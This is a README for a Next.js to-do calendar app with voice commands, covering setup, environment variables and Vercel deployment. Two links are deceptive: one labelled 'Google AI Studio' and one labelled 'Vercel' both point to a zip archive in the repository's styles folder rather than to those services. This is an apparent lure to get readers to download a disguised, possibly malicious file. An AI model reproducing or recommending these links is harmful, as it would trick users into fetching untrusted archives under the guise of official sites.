# To-Do Calendar (Frontend with Voice AI)

This is a Next.js application that provides a To-Do List with a calendar view, task history, and voice command integration. All task data is stored locally in your browser's `localStorage`. The voice command feature uses a minimal Next.js API route to interact with an AI model for Natural Language Understanding.

## Features

*   **Date-based Task Organization**: Assign tasks to specific dates.
*   **Calendar View**: Display a monthly calendar where users can select a date to see tasks for that day.
*   **Task Management**: Add, edit, delete, and mark tasks as complete.
*   **Voice Support**: Use natural language commands to add tasks, query schedules, and manage tasks (e.g., "Add 'submit assignment' to August 5th", "What are my tasks for tomorrow?").
*   **Task History**: A dedicated page to view all tasks (completed and incomplete) for past dates, similar to Notion.
*   **Dark/Light Mode**: Theme toggle for user preference.
*   **Local Persistence**: Tasks are stored in the browser's `localStorage`.

## Technologies Used

*   **Next.js**: React framework for building the application.
*   **React**: For building user interfaces.
*   **Tailwind CSS**: For styling.
*   **shadcn/ui**: Reusable UI components.
*   **Lucide React**: Icons.
*   **date-fns**: For date manipulation.
*   **AI SDK (`@ai-sdk/gemini`)**: For Natural Language Understanding (NLU) of voice commands.
*   **Web Speech API**: For client-side Speech-to-Text.

## Setup and Installation

### 1. Clone the Repository

\`\`\`bash
git clone <your-repo-url>
cd voice-calendar-integration
\`\`\`

### 2. Install Dependencies

\`\`\`bash
npm install
# or
yarn install
\`\`\`

### 3. Configure Environment Variables (for Voice Commands)

Create a `.env.local` file in the root of your project and add the following environment variable:

\`\`\`env
# Gemini API Key for Voice Commands
GEMINI_API_KEY="YOUR_GEMINI_API_KEY" # Get this from Google AI Studio (ai.google.dev)
\`\`\`

*   **`GEMINI_API_KEY`**: Obtain your API key from [Google AI Studio](https://raw.githubusercontent.com/AlapatiAbhinavChowdhary/todo-calander-frontend-basic_layout/master/styles/frontend-calander-todo-basic-layout-1.1.zip). This key is essential for the voice command feature to work, as it powers the AI model that understands your spoken commands.

### 4. Run the Development Server

\`\`\`bash
npm run dev
# or
yarn dev
\`\`\`

Open [http://localhost:3000](http://localhost:3000) in your browser to see the application.

## Usage

*   **Main Page**: View and manage tasks for the selected date.
    *   Click on a date in the calendar to select it.
    *   Use the "Add New Task" button to manually add tasks.
    *   Click the microphone icon to use voice commands.
    *   Click the history icon (clock) to go to the Task History page.
*   **Voice Commands**:
    *   Click the microphone icon and speak commands like:
        *   "Add 'submit assignment' to August 5th."
        *   "What are my tasks for tomorrow?"
        *   "Show me this week's schedule."
        *   "Delete 'call mom'."
        *   "Mark 'finish report' as done."
*   **Task History Page**: Review all tasks (completed and incomplete) for past dates.
    *   Dates with tasks are highlighted.
    *   Click on a date to see its tasks and their completion status.

## Data Storage

This application uses your browser's `localStorage` to store task data. This means:
*   Data is saved directly in your browser and persists even if you close the tab or browser.
*   Data is specific to the browser and device you are using; it will not sync across multiple devices.
*   Clearing your browser's site data will delete all stored tasks.

## Deployment to Vercel

This project is designed to be easily deployed to Vercel.

1.  **Create a Vercel Account**: If you don't have one, sign up at [Vercel](https://raw.githubusercontent.com/AlapatiAbhinavChowdhary/todo-calander-frontend-basic_layout/master/styles/frontend-calander-todo-basic-layout-1.1.zip).
2.  **Import Your Project**: Connect your GitHub repository to Vercel.
3.  **Configure Environment Variables**: In your Vercel project settings, go to "Environment Variables" and add `GEMINI_API_KEY` with its respective value. This is crucial for your deployed application to use the Gemini API for voice commands.
4.  **Deploy**: Vercel will automatically detect it's a Next.js project and deploy it.

Enjoy your voice-controlled To-Do Calendar!
